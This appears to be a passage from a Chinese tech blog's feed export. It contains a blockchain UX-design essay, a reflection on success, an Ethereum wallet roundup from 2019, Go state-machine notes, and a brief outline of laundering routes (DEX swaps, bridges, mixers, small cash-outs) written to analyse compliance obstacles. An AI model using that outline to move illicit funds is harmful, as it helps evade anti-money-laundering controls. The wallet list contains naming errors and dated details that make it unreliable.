<h3 id="加入以太坊"><a href="#加入以太坊" class="headerlink" title="加入以太坊"></a>加入以太坊</h3><p>在2017年7月，我加入了ConsenSys，这是一家主要专注于在Ethereum上构建应用的工作室。在写这篇文章的时候（3月23日），ConsenSys有47个活跃的“spokes”，它们基于区块链之上，工作在教育方法，赏金，土地登记，数据科学，会计，音乐和版权，科幻世界，医疗保健和供应链等等方面。这对设计师来说意味着什么，当我想到这个空间的设计意味着什么时，我突然间想到了更多的信息，用户组和数据。</p>
<p>而在将加密电子货币方面与“真正的区块链可修复的问题”分开之前，我在ConsenSys似乎看到了什么事情可以让我们做到这一点。在比赛后期，我问自己：“在没有中央集权的情况下与一个大集团合作意味着什么？没有中间商的情况下，价值可以转移到什么程度？”</p>
<h3 id="饥饿设计"><a href="#饥饿设计" class="headerlink" title="饥饿设计"></a>饥饿设计</h3><p>尽管区块链已经存在近十年了（自从Satoshi在2009年开发比特币创世区块以来），仍然没有足够的设计师，或者对设计师的实际操作有足够的了解。直到去年为止才有好转，因为大多数Web3用户都是那些非常感兴趣和有动力的人。一开始，这些情况大部分发生在命令行中，这些用户已经了解了系统。他们会忍无可忍。但是区块链的成功 - 这种分布式账本未来的传言 - 不仅取决于高度熟练和感兴趣的用户能否采用，还取决于那些试图做好工作，购买商品或玩得开心的普通人。</p>
<p>像2017年12月的Cryptokitties拥堵危机等一些基础设施团队日益增长的问题，它带来了更多的临时用户进入这个空间，迫使很多团队重新评估他们的用户体验。 Cryptonerds开始对设计的力量更加感兴趣，希望设计师们做好准备。</p>
<h3 id="设计思维"><a href="#设计思维" class="headerlink" title="设计思维"></a>设计思维</h3><p>人们对区块链感到非常兴奋，有时只是想制造一些东西 - 任何东西 - 使用它，不管是否有人真的需要它。 我们必须依靠一个坚实的过程来确保我们知道正在解决哪些问题以及如何知道是否确实正在解决问题。 通过这个测试并确定你是否真的解决了问题的一个策略是设计思维练习。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/3.png"><br>“设计思维”只是解决关注人类问题的一种方式。 例如，让我们都同意并验证问题甚至是第一个问题。 然后，它就像绘图，原型设计和验证假设一样 - 因为产品团队（业务，设计和工程）的所有部分都需要参与。</p>
<h3 id="低高保真"><a href="#低高保真" class="headerlink" title="低高保真"></a>低高保真</h3><p>当他们仍然在餐巾上时评估想法和解决方案。当你被颜色，按钮风格和字体分散注意力时，你不能专注于重要的事情,比如，它是否解决了问题？是否有要采用的层次结构？<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/4.png"><br>Metamask 的设计师Christian Jeria迅速勾勒出想法，向研讨会中的用户展示。</p>
<h3 id="用户研究"><a href="#用户研究" class="headerlink" title="用户研究"></a>用户研究</h3><p>一旦你了解了区块链，为大多数用户客观设计已经太迟了。因为你不是你的用户。所以显然你需要研究和测试更多。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/5.png"><br>不过，我认为最有效的策略是参与式设计，将用户带入研讨会。你不仅可以看到他们使用的东西，他们可以提供即时反馈，并与你共同构思。事情稍微复杂一点 - 签署法律文件，在特定地点采购用户，并制定补偿或奖励措施 - 但收益是指数级的。</p>
<h3 id="合作"><a href="#合作" class="headerlink" title="合作"></a>合作</h3><p>在这个领域良好合作是非常关键的，因为团队中的任何一个人都不太可能完全理解所有领域。在ConsenSys，大多数团队都是远程的（分散的），所以必须制定新的策略，以创建“同一个房间中的每个人”动态：能够快速移动，被动地知道你的团队正在做什么，以及当语言不起作用时，互相展示你的意思。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/6.png"></p>
<h3 id="围绕“信赖机器”设计信任"><a href="#围绕“信赖机器”设计信任" class="headerlink" title="围绕“信赖机器”设计信任"></a>围绕“信赖机器”设计信任</h3><p>去年，一位同事说：“仅仅因为区块链技术的建立可以消除对信任的依赖，并不意味着用户会信任机器或网络。”就像我之前说过的那样，当时我认为这是使界面更加“值得信赖” - 对通过界面发生的事情更加诚实。</p>
<p>然而，我认为“为信任而设计”比这更深刻。我们现在很难将经验与技术分开。当看到sprint的用户故事时，我会注意到这一点 - 将用户需求与网络/系统需求混淆非常容易。所以试图定义这些图层，我认为真正的关键是能够分辨它们之间的差异。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/7.png"><br>我认为确实在谈论三种（也许更多）设计的层次：信任机器（区块链），人类系统相互信任和信任感。</p>
<h3 id="1-信任机器"><a href="#1-信任机器" class="headerlink" title="1.信任机器"></a>1.信任机器</h3><p>第一层是设计层，它帮助用户信任区块链的各个方面。这意味着围绕现有系统进行设计，帮助人们以最痛苦的方式与机器进行交互，并教育用户了解正在发生的事情。设计师必须了解区块链是如何工作的，以了解什么可以或不可以改变，以便设计诸如gas，等待时间，智能合同和私钥管理等功能。</p>
<p>尽管对用户进行教育和授权非常重要，但有时从设计角度来看，有必要努力将某些功能抽象出来，以便它们不会成为未来体验的组成部分。当然，关于用户是否应该了解参与的系统的所有内容是存在争议的。但期望每个用户都了解区块链的技术内部工作情况是不可能的。例如，用户不需要处理gas — 但现在，它仍然是体验的一部分。 CryptoKitty 危机完美地捕捉到了这种设计的困境。MetaMask的首席开发人员Dan Finlay对此进行了描述：</p>
<blockquote>
<p>主要问题在于用户发送的是一笔价格低于标准gas的交易，可能等待几天之后交易才能通过。但用户并不知道，用户感觉似乎整个以太坊网络都坏掉了。<br>在MetaMask上提出了一个小型解决方案：对于需要很长时间的交易，我们展示了一个按钮，让人们以更高的gas价格重新提交交易。那个小按钮基本上解决了整个问题。它允许人们参加gas拍卖。长期来说，要让用户不要成为加密经济学游戏中的被动乘客，而是成为活跃的玩家，这一点很重要。我们了解到，您不能简化gas拍卖。有时候，人们需要更高出价的动力。</p>
</blockquote>
<p>在区块链生态系统中，协作变得至关重要：设计师、研究人员和工程师紧密合作，为用户解决问题。这也是关于了解我们在历史上的位置 - 用未来的眼光和路线图来设计现在的东西。</p>
<p>以太坊的第二层缩放解决方案：状态通道，等离子和Truebit</p>
<p>对于以太坊来说，2018年是基础设施的一年。在生态系统开发出强大的扩展解决方案之前，信任设计也意味着在区块链上花费的交易时间。我们必须关注这些未决状态的用户体验：我们已经接受过技术培训，即使知道交易需要一段时间，仍然无法阻止挫折感和恐慌。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/8.png"></p>
<p>密钥管理是设计人员需要考虑的另一个关键用户体验。由于没有第三方在区块链空间管理用户的数字身份，因此用户必须使用私钥签署交易。安全和设计之间的权衡是长久的：设计是为了为用户创造最好的体验;安全性是为攻击者创造最糟糕的可能体验。必须平衡给予人完全控制的自由和给予人完全控制的危险。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/9.png"></p>
<p>Jonny Howle正在uPort上为此工作。当人们谈论区块链的好处时，他们经常使用“无摩擦”这个词。但让我们来谈谈这意味着什么 - 从中间人，等待时间，第三方等等中删除 - 在某些方面，在处理交易时确实有很好的用途与易犯错的人。作为设计师的一部分工作就是测量什么时间以及我们可以添加多少摩擦。</p>
<h3 id="2-相互信任"><a href="#2-相互信任" class="headerlink" title="2.相互信任"></a>2.相互信任</h3><p>除了促进对区块链的信任之外，设计师还需要设计帮助用户信任并用于彼此协作的机制。这是不同的，因为这些都是可以作为设计师改变的事情，在这之前我们只是设计与区块链机制最舒服的互动。</p>
<p>当一位同事首次向我提出“系统思维”作为产品设计师职位描述的技能时，我的反应很差。我们必须能够在用户研究和线框图，设计思维和原型以及前端和视觉设计和测试之间做到吗？</p>
<p>去年我曾见过一些文章，提出在系统思维和设计思维之间找到一个桥梁，这一切似乎都很累人。但后来我意识到设计人员已经在系统层面思考，例如Design Systems。可持续发展，循环设计和社交平台的设计人员都在不断地考虑这种方式。区块链设计师是事实上的系统思考者。</p>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/10.png"><br>因为现在有办法消除中间商，并快速转移对等价值 - 除了智能合约外 - 可以谈论如下事情：</p>
<ul>
<li>微小费用：激励用户更想要的东西。<a href="https://kauri.io/">Kauri</a>正在探索如何激励为以太坊开发者提供优质帮助。</li>
<li>赌注：给予团队一个理由认为你将以团队的最大利益作为行动指南。</li>
<li>令牌注册管理机构（TCRs）：允许大量相互不信任或不必相互信任的人组织在一起的机制。</li>
<li>治理：一群人如何决定事情？谁来投票？谁决定谁来投票？</li>
<li>众包：思想的聚合与思考，人群的智慧，预测市场以及汇集资金的能力。</li>
</ul>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/11.png"></p>
<p>设计机制是一个专门研究协议的领域，激励理性行为者以社会期望的方式行事。通常没有人能很好地理解用户并准确地预测用户的行为。必须为系统中的每个利益相关者绘制和设计步骤，同时必须经过研究和测试。</p>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/12.png"><br>这就是将以人为本的设计、系统思维、机制设计和隐含经济学结合在一起的地方。人们不会为了一个系统而参与系统：必须研究激励以及他们如何映射到某人想要完成的事情。设计师需要了解并很好地调整激励措施，以便恰当地设计出可用且令人愉快的体验，并且还能维持更大的系统。</p>
<h3 id="3-信任感"><a href="#3-信任感" class="headerlink" title="3.信任感"></a>3.信任感</h3><p>必须创建的最后一层是对信任的公开展示 - 人类被视为可信赖的一切。这个设计原则从Designing for Trust 1.0开始，主要是关于良好的设计：</p>
<ul>
<li>显式控制。界面应该以用户期望的方式运行。它不应该做用户没有明确告诉它做的事情</li>
<li>减少焦虑和认知负担。复杂的相互作用会放慢速度并逐渐消失。</li>
<li>指导一致性。视觉元素为用户提供暗示，让他们知道该期待什么 - 形状和颜色等元素在界面中具有意义。</li>
<li>尊重既定的约定。除非绝对必要，否则不要让用户学习新的模式。</li>
</ul>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/13.png"></p>
<p>还有其他一些方法来表现和证明可靠性。来自外部权威机构的徽章 - 例如推特帐户或批准的商人印章 - 是一种明显的方式。另一个是积极寻找是什么让用户感到困惑或焦虑，并解决这个问题。民众正在努力打击假新闻，在研究中了解到，内容消费者并不真正了解如何评估新闻的准确性或质量。他们提出了“信誉指标”来教育消费者为什么要信任某些信息。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/14.png"></p>
<h3 id="设计师是保护者"><a href="#设计师是保护者" class="headerlink" title="设计师是保护者"></a>设计师是保护者</h3><p>最后也是最重要的设计信任：道德和保护用户。如果人们最终因我们所做的事情而受到伤害，那么“信任机器”就会失败。就像在开始时所说的，事实是，区块链影响着人们生活中最亲密的部分 - 比如金钱，身份和健康 - 但生活往往像狂野的西部。</p>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/15.png"></p>
<p>区块链最引人注目的方面之一是在任何时候网络状态都是透明的。但是，这种激进的透明度有时会成为令人担忧的原因。如果有什么应该将你的真实生活身份与地址联系起来，那么你所做的一切都在那里。就个人而言，我担心数据三角测量 - 与其他数据结合变得敏感的无害数据。我们必须仔细考虑区块链上的数据以及管理的链接数据。像zkSNARKS这样的隐私解决方案提供了在不透露交易数据的情况下顺畅地在区块链上进行交易的机会。</p>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/16.png"><br>用户面临的危险大部分存在于他们与区块链之间的空间中。除了作为攻击点 - 未授权用户可以攻击的不同点（输入或提取数据）的总和 - 这是人们忘记或丢失私钥的地方。这是诈骗活动的地方。</p>
<p><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/17.png"><br>仅仅因为这些问题没有在区块链上发生，它们仍然是区块链高速路入口的一部分。必须尽一切可能来教育和保护人们。当出现问题时，用户会不顾一切地指责区块链。</p>
<p>进入这个领域的原因是因为我想帮助别人，但有些时候我很担心。很担心现实生活中的黑镜头剧集，在完全理解我们正在取代的内容之前，用区块链代替传统系统，并构建只激励利润，上瘾（像当前的社交平台）或不良行为的系统（但并没有预料到）。</p>
<h3 id="行动号召"><a href="#行动号召" class="headerlink" title="行动号召"></a>行动号召</h3><p>设计师，我们需要你在这里。几乎所有的项目都有可能改变我们做事情的方式，而且您有能力影响这种变化是正面还是负面。有很多重要的想法和紧迫的哲学问题，我们需要人们对这些话题给予关注。我们需要知道如何构思，测试，研究，迭代，实验和运送产品的人员。</p>
<p>如果你是新手，不要只阅读文章。其实参与是快速学习的最佳途径。安装Metamask，购买Cryptokitty。在Coinbase上购买数字货币，然后花在Overstock上。</p>
<p>区块链不仅仅是加密货币，所以要探索其他社区。查看Ujo的创作者门户网站和Cellarius的故事讲述平台。尝试赏金或Gitcoin的设计任务。编写智能合同或构建dApp的教程。把你的手指放在区块链上。</p>
<p>不要害怕提问。每个人都是新的，我们一起解决它。在ConsenSys，我们一直在寻找产品设计师，系统和设计思想家，设计研究人员等等。我们需要您的帮助来构建和设计人们可以信任的分布式未来。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是成功</title>
    <url>/2019/11/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%88%90%E5%8A%9F/</url>
    <content><![CDATA[<p>首先声明本人不是什么成功人士，无论是哪一种标准。但是我还是想说说本人对成功标准的看法。</p>
<p>本人认为亿万财富不是成功，位高权重不是成功，<strong>追求并实现了自身认为的善事即为成功</strong>。什么是善事呢？ “善”的形体，是上面一只“羊”，下面两个“言”，而这只羊的颈上，系着一个绳套。  “羊”的驯良美好的品性之意，所以“善”的本义是“良”、“好”、“驯善”，其后又引申出“友好”、“擅长”、“赞许”、“容易”、“熟悉”等等意思来。本人认为 <strong>善就是予人以帮助的意思。</strong>例如，对一个人指路即是善事，对很多个人资助上学，完成学业就是大善事。和善相对的是恶，恶的释义是需要修正的，坏的行为。本人认为<strong>恶就是予人与破坏的意思</strong>。例如，偷盗等。</p>
<p>其次，我们需要实现善念才能够成功。如何实现善念呢？我们的理工科、医科、商科等等教育就是我们的工具。</p>
<p>现在的生活中，工具很多，但是不善的事也是有的。例如，有的App偷偷地手机个人信息，然后并不告诉用户，还售卖这些信息；例如，经过xx大数据分析，本年度的电动牙刷在外形的某部位加装一个金属圈，在上个月的销售中位居榜首。本人过于刻板，认为这样子的“创新”更加接近钻营。过于钻营就容易走向恶，过于追求结果就容易走错方向。</p>
<p>所以从自己对成功定义的标准出发，我是走在成功路上的。</p>
<p><img src="/2019/11/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%88%90%E5%8A%9F/1.png"></p>
<p>至于说成功后的结果可以是亿万富翁，也可以是人民公仆，更加可以是人民英雄。</p>
<p>说到最好，如上图，列举了物的规则（唯物主义）、善恶（唯心主义）和成功（辩证唯物主义的方法论），图中将三者对号入座。</p>
]]></content>
      <tags>
        <tag>leadership</tag>
      </tags>
  </entry>
  <entry>
    <title>以以太坊为例分析公有链交易合规的技术障碍</title>
    <url>/2022/05/12/%E4%BB%A5%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%BA%E4%BE%8B%E5%88%86%E6%9E%90%E5%85%AC%E6%9C%89%E9%93%BE%E4%BA%A4%E6%98%93%E5%90%88%E8%A7%84%E7%9A%84%E6%8A%80%E6%9C%AF%E9%9A%9C%E7%A2%8D/</url>
    <content><![CDATA[<p>假设一个罪犯，他想要将钱洗干净：</p>
<p>1）通常他会将钱转移到一个干净的地址，很可能会建立控制权，这样可以否认自己是当事方；</p>
<p>2）开始交易：</p>
<ul>
<li>在DEX (AMM)交易所中交易，可能是几次投资性交易，最终回到stable coin；</li>
<li>在中心化交易所交易，其历史交易记录保存在其中心化order_book_history中；</li>
<li>在桥接协议中去到其他公有链交易，混淆交易路径；</li>
<li>利用零知识证明、混币等隐私交易，可以隐藏交易路径以及金额；</li>
<li>通过 scaling protocol 交易，可以做隐私交易，如zksync；也可以只做rollup，如Optimism；也可能是state channel，如Raiden Network只记录blockhash而已；</li>
<li>隐私合约，桥接合约，HTLC合约等可以是新部署，且只服务若干笔交易；</li>
<li>以上交易方式可以搭配，组合使用。</li>
</ul>
<p>3）最终从一个干净的地址，甚至（关联交易，关联账户）拆解成为小额交易，从交易所交易成为现金取出。</p>
<p>另外，未来还有一种可能会影响合规和审计：</p>
<p>1）隐私合约，桥接合约，HTLC合约等可以是新部署，且只服务若干笔交易；</p>
<p>2）交易有可能是废弃的，无效的 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-5081.md%EF%BC%9B">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-5081.md；</a></p>
<p>3）以太坊删除无用的state数据。</p>
<p>最后，Even if a contract is removed by <code>selfdestruct</code>, it is still part of the history of the blockchain and probably retained by most Ethereum nodes. So using <code>selfdestruct</code> is not the same as deleting data from a hard disk. 合约删除不会是技术障碍。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊最佳钱包总结</title>
    <url>/2019/03/27/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%9C%80%E4%BD%B3%E9%92%B1%E5%8C%85%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>在我看来，下面这些是加密货币钱包需要的：</p>
<ul>
<li>私钥 - 由钱包来控制用户的私钥</li>
<li>易用性 - 优雅的用户界面，易于用户使用</li>
<li>开发社群 - 活跃的开发社群支持钱包不断更新和优化</li>
<li>备份和安全 - 备份和恢复的特性</li>
<li>兼容性 - 与不同的操作系统相兼容</li>
</ul>
<p>个人认为，在寻找钱包时，需要确保满足上述要求。在这里，我列出了以太坊最好的钱包。 它们都符合上述要求。 </p>
<p><strong>1.Ledger Nano S (Hardware Wallet)](<a href="https://www.ledger.com/">https://www.ledger.com/</a>)</strong></p>
<p>Ledger Nano S是最便宜的以太坊硬钱包之一（65美元）。此处，以太币在设备上脱机存储。 无论何时想花费以太币，Ledger都会使用存储在设备上的私钥对其进行签名。您可以存储ETH和ETC。</p>
<p><img src="/2019/03/27/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%9C%80%E4%BD%B3%E9%92%B1%E5%8C%85%E6%80%BB%E7%BB%93/LedgerNanoS.jpg"></p>
<p>关于Ledger Nano S最棒的地方是它配备了一个小型OLED屏幕，可以控制您的交易。安全性非常强大，即使在黑客计算机上也可以使用Nano S设备。</p>
<p><strong>2. <a href="https://trezor.io/">Trezor (Hardware Wallet)</a></strong></p>
<p>Trezor是比特币发明的第一个硬件钱包。但是，现在Trezor也可以通过MyEtherWallet Web界面用于以太坊。它还将以太币脱机存储在安全的电子芯片上，只有在您使用密码登录时才能激活。它是一种非常轻便的便携式设备，售价99美元。</p>
<p><strong>3. <a href="https://atomicwallet.io/">Atomic (Desktop)</a></strong></p>
<p>Atomic钱包是以太坊和ERC20 Token的终极解决方案。钱包可以使用银行卡存储，交换和购买ETH。将来，以太坊将可用于交换Atomic Swaps——这是一种完全分布式的方式，用于在不涉及中介的情况下做 Token 交易。</p>
<p>Atomic Wallet支持300多种加密货币，提供所有ERC20 Token 报价的界面。基本上，您可以输入联系地址并在自己的原子钱包中使用自定义代币。钱包会对您设备上的私钥进行加密，并为您提供对资金的完全访问权限和控制权。</p>
<p>Atomic Wallet适用于任何桌面操作系统，适用于Android和iOS设备。</p>
<p><strong>4. <a href="https://www.exodus.io/">Exodus (Desktop Wallet)</a></strong></p>
<p>Exodus是世界上第一个多加密货币桌面钱包。免费使用，用户界面非常具有吸引力。当您打开Exodus钱包，饼图就会显示您的整个Token组合。Exodus是第一款内置ShapeShift用于交换加密货币的桌面钱包。但是，在使用Exodus时，需要始终连接到互联网，但您不必担心，因为您的私钥永远不会离开您的机器。并且用于还原钱包的一键式电子邮件恢复和备份种子密钥等功能可确保您的资金安全。</p>
<p>Exodus现在支持近100种加密货币！他们还有多个交易所合作伙伴（不仅仅是ShapeShift），这意味着我们可以提供更多可交换资产。从各个合作伙伴那里获取流动资金使得Exodus的交换更快更可靠。</p>
<p>他们也不需要个人电子邮件 - 这是希望收到电子邮件备份链接的人的选项。可以使用任何电子邮件地址 - 或者根本不使用！电子邮件仅用于发送备份链接一次。隐私对Exodus非常重要，他们不存储任何客户个人数据 - 甚至不包括电子邮件地址。</p>
<p><strong>5. <a href="https://coinsutra.com/jaxx-wallet-review/">Jaxx</a> (Mobile Wallet)</strong></p>
<p><img src="/2019/03/27/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%9C%80%E4%BD%B3%E9%92%B1%E5%8C%85%E6%80%BB%E7%BB%93/Jaxx.jpg"></p>
<p>Jaxx是一个多资产钱包，由总部位于加拿大<a href="http://decentral.ca/">Decentral</a>创建。它支持13种加密货币(包括ETH)，具有优雅的设计和健壮的安全特性。</p>
<p>在Jaxx上，私有密匙永远不会离开设备，而种子密匙等特性使您能够在需要时恢复资金。</p>
<p>它有一个惊人的开发社区，负责产品的创新和维护。</p>
<p>支持平台桌面(Windows, Mac OS, Linux)，扩展(Chrome, Firefox)，移动/平板(苹果，Android)。不需要注册或个人信息。支持智能合同。</p>
<p>Jaxx钱包适用于Android、iOS、Mac OS、Windows和Linux。他们还将在未来几个月推出一款硬件钱包。</p>
<p>6.<strong><a href="https://metamask.io/">MetaMask</a> (Desktop Wallet)</strong></p>
<p>MestaMask是我最喜欢的以太钱包之一。</p>
<p>它就像一个浏览器访问以太网络。它不仅使您能够存储和发送Ethereum，还允许您访问Dapp程序。</p>
<p>它有一个直观的设计，您可以在测试网络和主要以太网络之间快速切换。</p>
<p>私钥是密码加密的，存储在您的机器上，您可以随时导出。</p>
<p>支持的平台：Firefox，Chrome extensions。不需要注册或个人信息。支持智能合同。</p>
<p><strong>7</strong>.<a href="https://www.myetherwallet.com/"><strong>MyEtherWallet</strong> </a> <strong>(Web Wallet)</strong></p>
<p>MestaMask是我最喜欢的以太钱包之二 :)。</p>
<p>MyEtherWallet是一个离线的冷钱包，在这里你可以控制本地机器上以太坊的私钥。</p>
<p>它是一个开源钱包，无需第三方服务器，可以在其中编写和访问智能合同。它有一个内置的BTC到ETH，以及多币种(反之亦然)交易设施。您还可以连接您的Trezor或Ledger Nano S，以访问您的资金在MyEther的浏览器环境。</p>
<p><strong>8.</strong> <a href="https://wallet.coinbase.com/"><strong>Coinbase</strong></a> <strong>(Mobile Wallet)</strong></p>
<p>Coinbase支持比特币和以太坊。</p>
<p>这是一种既便宜又快捷的储存以太的方法，前提是它们为你的国家服务。你可以在这里查一下你们国家是否有他们的服务。如果是，请按照以下步骤使用Coinbase:</p>
<ol>
<li><p>在Coinbase登记（邮箱注册，注册个人信息）。</p>
</li>
<li><p>获取你的公共地址。</p>
</li>
<li><p>把你的电子计算机转移到Coinbase的公共地址。</p>
</li>
<li><p>将ETH存储在Coinbase上。</p>
</li>
</ol>
<p>然而，缺点是私钥不在您的控制中，因为它们存储在Coinbase的托管服务器上。Coinbase不支持智能合约。</p>
<p>也就是说，这是一种很好的短期储存ETH的方法。如果打算长期持有以太币，应该使用纸质钱包的方法或使用像Ledger Nano S这样的硬件钱包。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>startup-product-20220917</title>
    <url>/2022/09/19/golang-fsm/</url>
    <content><![CDATA[<p><a href="http://github.com/looplab/fsm">http://github.com/looplab/fsm</a></p>
<p>定义状态机的时候有三部分组成：状态机的初始状态，状态机的事</p>
<p>件（包括了多个源事件和一个目的事件），状态机的事件回调。整体来说，回</p>
<p>调可以分为四组8个回调，按执行顺序依次为：</p>
<p>1，事件开始之前</p>
<p>​    A，before_xxx，特定的状态之前</p>
<p>​    B，before_event所有状态之前</p>
<p>2，离开老状态</p>
<p>​    A，leave_xxx 离开特定状态</p>
<p>​    B，leave_state 离开所有状态</p>
<p>3，进入新状态</p>
<p>​    A，enter_xxx,进入特定状态</p>
<p>​    B，enter_state 进入所有状态</p>
<p>4，事件执行完毕之后</p>
<p>​    A，after_xxx 进入特定状态之后</p>
<p>​    B，after_event 进入所有状态</p>
<p>状态机实现的函数接口有：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">AvailableTransitions</span><span class="params">()</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Can</span><span class="params">(event <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Cannot</span><span class="params">(event <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Current</span><span class="params">()</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Event</span><span class="params">(event <span class="keyword">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Is</span><span class="params">(state s/ring)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Metadata</span><span class="params">(key <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">interface</span>&#123;&#125;, <span class="keyword">bool</span>)</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">SetMetadata</span><span class="params">(key <span class="keyword">string</span>, dataValue <span class="keyword">interface</span>&#123;&#125;)</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">SetState</span><span class="params">(state <span class="keyword">string</span>)</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Transition</span><span class="params">()</span> <span class="title">error</span></span></span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Can</span><span class="params">(event <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line">  _, ok := f.transitions[eKey&#123;event, f.current&#125;]</span><br><span class="line">  <span class="keyword">return</span> ok &amp;&amp; (f.transition == <span class="literal">nil</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">//执行事件流转</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Event</span><span class="params">(event <span class="keyword">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span>&#123;</span><br><span class="line">    e := &amp;Event&#123;f, event, f.current, dst, <span class="literal">nil</span>, args, <span class="literal">false</span>, <span class="literal">false</span>&#125;</span><br><span class="line">    err := f.beforeEventCallbacks(e)</span><br><span class="line">   f.transition = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">     f.enterStateCallbacks(e)</span><br><span class="line">     f.afterEventCallbacks(e)</span><br><span class="line">    &#125;</span><br><span class="line">   f.leaveStateCallbacks(e)</span><br><span class="line">   err = f.doTransition()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">enterStateCallbacks</span><span class="params">(e *Event)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> fn, 